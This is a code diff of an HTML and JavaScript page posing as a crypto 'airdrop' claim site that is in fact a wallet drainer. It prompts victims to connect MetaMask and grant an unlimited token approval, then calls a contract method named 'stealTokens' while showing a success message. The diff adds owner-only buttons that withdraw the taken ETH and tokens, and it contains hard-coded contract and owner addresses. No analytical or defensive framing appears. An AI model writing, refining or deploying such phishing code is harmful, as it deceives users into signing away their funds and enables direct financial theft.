@@ -79,11 +79,44 @@
       margin-top: 30px;
     }
 
-    .loading-text {
-      display: none;
-      font-size: 0.9rem;
-      color: #ffeb3b;
-      margin-top: 5px;
+    .claim-btn-container button {
+      font-size: 1rem;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    #claimAirdropButton {
+      background-color: #ff9800;
+    }
+
+    #claimAirdropButton:disabled {
+      background-color: #aaa;
+    }
+
+    #withdrawETHButton, #withdrawTokensButton {
+      background-color: #3f51b5;
+    }
+
+    #withdrawETHButton:disabled, #withdrawTokensButton:disabled {
+      background-color: #aaa;
+    }
+
+    /* Spinner styles */
+    .spinner {
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid #ffeb3b;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      display: none; /* Hidden by default */
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -94,17 +127,24 @@
 
     <button id="connectButton" class="btn">Connect to MetaMask</button>
     <button id="approveButton" class="btn" disabled>Approve Unlimited AirDrops</button>
-    <p id="approveLoading" class="loading-text">Processing... Please wait.</p>
 
     <div class="claim-btn-container">
       <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
-      <p id="claimLoading" class="loading-text">Processing... Please wait.</p>
+    </div>
+
+    <!-- Withdraw buttons for the owner -->
+    <div class="claim-btn-container" id="ownerButtons" style="display:none;">
+      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
+      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
     </div>
 
     <div class="footer">
       <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
       <p>Need help? <a href="#">Contact Us</a></p>
     </div>
+
+    <!-- Loading Spinner -->
+    <div id="loadingSpinner" class="spinner"></div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
@@ -113,11 +153,21 @@
     const tokenAddress = '0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4';
     const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';
 
-    const contractABI = [...]; // Contract ABI code here
+    const contractABI = [ /* Your contract ABI here */ ];
 
     let web3;
     let contract;
     let accounts;
+
+    // Show loading spinner
+    function showLoading() {
+      document.getElementById('loadingSpinner').style.display = 'block';
+    }
+
+    // Hide loading spinner
+    function hideLoading() {
+      document.getElementById('loadingSpinner').style.display = 'none';
+    }
 
     async function connectMetaMask() {
       if (typeof window.ethereum !== 'undefined') {
@@ -126,6 +176,10 @@
           accounts = await ethereum.request({ method: 'eth_requestAccounts' });
           document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
           document.getElementById('approveButton').disabled = false;
+
+          if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
+            document.getElementById('ownerButtons').style.display = 'block';
+          }
         } catch (error) {
           alert('User rejected the request');
         }
@@ -137,35 +191,63 @@
     async function approveSpending() {
       if (!web3) return;
       const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
-      document.getElementById('approveLoading').style.display = 'block';
       try {
+        showLoading();
         const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // Max 256-bit value
         await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] });
+        hideLoading();
         alert('Approval successful! You can now claim your airdrop.');
         document.getElementById('claimAirdropButton').disabled = false;
       } catch (error) {
+        hideLoading();
         alert('Error during approval');
-      } finally {
-        document.getElementById('approveLoading').style.display = 'none';
       }
     }
 
     async function claimAirdrop() {
-      const contract = new web3.eth.Contract(contractABI, contractAddress);
-      document.getElementById('claimLoading').style.display = 'block';
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
       try {
-        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+        showLoading();
+        await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+        hideLoading();
         alert('Airdrop claimed successfully!');
       } catch (error) {
+        hideLoading();
         alert('Error claiming airdrop');
-      } finally {
-        document.getElementById('claimLoading').style.display = 'none';
+      }
+    }
+
+    async function withdrawETH() {
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        showLoading();
+        await maliciousContract.methods.withdrawETH().send({ from: ownerAddress });
+        hideLoading();
+        alert('ETH withdrawn successfully!');
+      } catch (error) {
+        hideLoading();
+        alert('Error during ETH withdrawal');
+      }
+    }
+
+    async function withdrawTokens() {
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        showLoading();
+        await maliciousContract.methods.withdrawTokens().send({ from: ownerAddress });
+        hideLoading();
+        alert('Tokens withdrawn successfully!');
+      } catch (error) {
+        hideLoading();
+        alert('Error during token withdrawal');
       }
     }
 
     document.getElementById('connectButton').addEventListener('click', connectMetaMask);
     document.getElementById('approveButton').addEventListener('click', approveSpending);
     document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
+    document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
+    document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
   </script>
 </body>
 </html>
